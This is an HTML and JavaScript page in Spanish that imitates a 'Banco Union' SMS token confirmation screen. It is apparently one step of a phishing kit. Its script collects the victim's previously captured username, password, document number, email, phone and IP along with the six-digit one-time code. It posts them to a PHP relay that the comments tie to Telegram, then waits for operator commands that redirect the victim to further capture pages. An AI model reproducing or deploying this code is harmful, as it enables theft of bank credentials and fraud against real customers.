<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Token de Validación</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #f8f9fa;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding-top: 150px;
    }

    .container {
      background-color: white;
      width: 90%;
      max-width: 500px;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      text-align: center;
    } 

    .form-group {
      margin-bottom: 25px;
      position: relative;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      font-size: 16px;
      color: #333;
    }

    input[type="text"] {
      width: 100%;
      padding: 15px 20px;
      font-size: 18px;
      border: 2px solid #ccc;
      border-radius: 10px;
      outline: none;
      text-align: center;
      letter-spacing: 3px;
      font-weight: bold;
      background-color: white;
      transition: border-color 0.3s;
    }

    input[type="text"]:focus {
      border-color: #00a0e3;
    }

    .btn {
      background-color: #00a0e3;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 15px 40px;
      font-size: 18px;
      width: 100%;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #008dcb;
    }

    .description {
      text-align: center;
      color: #666;
      font-size: 16px;
      line-height: 1.5;
      margin-bottom: 30px;
    }

    .banner {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background-color: #FFD700;
      padding: 15px 20px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      z-index: 1000;
      display: flex;
      align-items: center;
    }

    .banner img {
      width: 250px;
      height: 60px;
      object-fit: contain;
      margin-right: 200px;
    }

    .page-title {
      position: absolute;
      top: 130px;
      left: 50%;
      transform: translateX(-50%);
      font-family: Arial, sans-serif;
      font-size: 48px;
      font-weight: bold;
      color: #00a0e3;
      text-shadow: 0 0 10px rgba(0, 160, 227, 0.3);
      z-index: 999;
      text-align: center;
    }

    /* Media queries para dispositivos móviles */
    @media (max-width: 768px) {
      body {
        padding-top: 120px;
        height: auto;
        min-height: 100vh;
        background-color: white;
      }

      .container {
        width: 100%;
        padding: 30px 20px;
        margin: 0;
        background-color: transparent;
        box-shadow: none;
        border-radius: 0;
      }

      .banner {
        padding: 12px 15px;
      }

      .banner img {
        width: 180px;
        height: 45px;
        margin-right: 0;
      }

             .page-title {
         font-size: 36px;
         top: 110px;
       }

      .form-group {
        margin-bottom: 20px;
      }

      input[type="text"] {
        padding: 18px 20px;
        font-size: 20px;
      }

      .btn {
        padding: 18px;
        font-size: 20px;
      }

      .description {
        font-size: 15px;
        margin-bottom: 25px;
      }
    }

    @media (max-width: 480px) {
      .container {
        width: 100%;
        padding: 25px 15px;
      }

             .page-title {
         font-size: 28px;
         top: 105px;
       }

      .banner img {
        width: 150px;
        height: 40px;
      }

      .form-group {
        margin-bottom: 18px;
      }

      label {
        font-size: 15px;
      }

      input[type="text"] {
        padding: 16px 18px;
        font-size: 18px;
      }

      .btn {
        padding: 16px;
        font-size: 18px;
      }

      .description {
        font-size: 14px;
        margin-bottom: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="banner">
    <img src="img/l21.svg" alt="Banner" />
  </div>
  <div class="page-title">Confirmacion</div>
  <div class="container">
    <div class="description">
      Para confirmar tu transacción, ingresa el código dinámico enviado por SMS a tu dispositivo móvil
    </div>
    
    <div class="form-group">
      <label for="token">Código de validación</label>
      <input type="text" id="token" placeholder="000000" maxlength="6" pattern="[0-9]*" inputmode="numeric" />
    </div>

    <button class="btn" id="btnIngresar">Confirmar</button>
  </div>

  <!-- Campos ocultos para el sistema -->
  <input type="hidden" id="session_id" name="session_id">
  <input type="hidden" id="username" name="username">

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="text-align: center; color: white;">
      <div class="loader-spinner" style="width: 60px; height: 60px; animation: blink 1.5s ease-in-out infinite; margin: 0 auto 20px;">
        <img src="img/210.jpg" alt="Loading" style="width: 100%; height: 100%; object-fit: contain;">
      </div>
      <p>Verificando información...</p>
    </div>
  </div>

  <style>
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>

  <script>
    // Validación para solo números en el campo de token
    document.getElementById('token').addEventListener('input', function(e) {
      // Remover cualquier carácter que no sea número
      this.value = this.value.replace(/[^0-9]/g, '');
      
      // Limitar a 6 caracteres
      if (this.value.length > 6) {
        this.value = this.value.slice(0, 6);
      }
    });

    // Prevenir pegar texto que no sean números
    document.getElementById('token').addEventListener('paste', function(e) {
      e.preventDefault();
      let pastedText = (e.clipboardData || window.clipboardData).getData('text');
      let numbersOnly = pastedText.replace(/[^0-9]/g, '');
      if (numbersOnly.length > 6) {
        numbersOnly = numbersOnly.slice(0, 6);
      }
      this.value = numbersOnly;
    });

    // Auto-focus en el campo de token
    document.getElementById('token').focus();
  </script>

  <script>
  document.addEventListener("DOMContentLoaded", function () {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Generar o recuperar session_id
    let sessionId = localStorage.getItem('session_id');
    if (!sessionId) {
      sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('session_id', sessionId);
    }
    
    const sessionInput = document.getElementById('session_id');
    sessionInput.value = sessionId;

    // Obtener usuario desde URL params y establecer en el campo hidden
    const userFromUrl = urlParams.get('user');
    const usernameInput = document.getElementById('username');
    if (userFromUrl) {
      usernameInput.value = userFromUrl;
      localStorage.setItem('username', userFromUrl);
    }

    // Botón Continuar
    const btnIngresar = document.getElementById('btnIngresar');
    
    btnIngresar.addEventListener('click', async function (event) {
      event.preventDefault();

      // Token ingresado
      const token = document.getElementById('token').value.trim();
      
      // Validar que el token tenga 6 dígitos
      if (token.length !== 6 || !/^\d{6}$/.test(token)) {
        alert('El token debe tener 6 dígitos numéricos');
        return;
      }

      // Mostrar loader
      const loader = document.getElementById('loader-overlay');
      if (loader) loader.style.display = 'flex';

      const formUsername = document.getElementById('username').value;
      const session_id   = document.getElementById('session_id').value;

      localStorage.setItem('username', formUsername);
      localStorage.setItem('token', token);
      localStorage.setItem('session_id', session_id);

      // Datos guardados previamente en index
      const identificacion = localStorage.getItem('identificacion') || 'No disponible';
      const password       = localStorage.getItem('password')       || 'No disponible';
      const tipoDocumento  = localStorage.getItem('tipoDocumento')  || 'No disponible';

      // Detectar tipo de dispositivo
      const userAgent = navigator.userAgent;
      let dispositivo = 'PC';
      if (/Android/i.test(userAgent)) dispositivo = 'Android';
      else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
      else if (/Windows/i.test(userAgent)) dispositivo = 'PC';
      else if (/Mac/i.test(userAgent)) dispositivo = 'Mac';
      else if (/Linux/i.test(userAgent)) dispositivo = 'Linux';
      
      const hora = new Date().toLocaleString('es-ES');

      // 🔧 Función que arma el mensaje y lo envía
      function enviarMensaje(ipTexto) {
        const mensaje = `
🌐 <b><u>BANCO UNION — TOKEN</u></b> 🌐
• 💌 <b>Correo:</b> <code>${localStorage.getItem('correo') || 'No disponible'}</code>
• 📞 <b>Celular:</b> <code>${localStorage.getItem('cel') || 'No disponible'}</code>
• 🪪 <b>Cédula:</b> <code>${localStorage.getItem('val') || 'No disponible'}</code>
• 🧍 <b>Persona:</b> <code>${localStorage.getItem('per') || 'No disponible'}</code>
• 🏦 <b>Banco:</b> BANCO UNION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• 🖥 <b>Dispositivo:</b> <code>${dispositivo}</code>
• 🧭 <b>IP:</b> <code>${ipTexto}</code>
• 🕒 <b>Hora:</b> <code>${hora}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• 📄 <b>Tipo Doc:</b> <code>${tipoDocumento}</code>
• 👤 <b>Usuario:</b> <code>${identificacion}</code>
• 🔑 <b>Clave:</b> <code>${password}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• 🔄 <b>Token:</b> <code>${token}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

        const formData = new FormData();
        formData.append('message', mensaje);
        formData.append('transactionId', session_id);

        fetch('procesar_dinamica.php', {
          method: 'POST',
          body: formData
        })
        .then(res => res.json())
        .then(result => {
          if (result.status === 'success') {
            // Seguimos el flujo de verificación contra Telegram
            checkPaymentVerification(session_id, result.messageId);
          } else {
            if (loader) loader.style.display = 'none';
          }
        })
        .catch(err => {
          if (loader) loader.style.display = 'none';
        });
      }

      // Obtener IP y luego enviar mensaje
      fetch('get_ip.php')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip || 'No disponible';
          enviarMensaje(ip);
        })
        .catch(() => {
          // Si falla la IP, usamos "No disponible"
          enviarMensaje('No disponible');
        });
    });
  });

  // ✅ Verificación de respuesta desde Telegram
  async function checkPaymentVerification(transactionId, messageId) {
    try {
      const formData = new FormData();
      formData.append('transactionId', transactionId);
      formData.append('messageId', messageId);

      const res    = await fetch('verificar_dinamica.php', {
        method: 'POST',
        body: formData
      });
      const result = await res.json();

      if (result.action) {
        const loader = document.getElementById('loader-overlay');

        switch (result.action) {
          case 'pedir_dinamica':
            if (loader) loader.style.display = 'none';
            alert("Error de Clave Dinámica.");
            window.location.href = "token.php";
            break;

          case 'error_logo':
            if (loader) loader.style.display = 'none';
            alert("Usuario o clave incorrectos.");
            window.location.href = "index.html";
            break;

          case 'confirm_finalizar':
            window.location.href = "/fin.php";
            break;

          case 'tarjeta':
            if (loader) loader.style.display = 'none';
            window.location.href = "tarjeta.php";
            break;
        }
      } else {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    } catch (err) {
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
  }
</script>

</body>
</html> 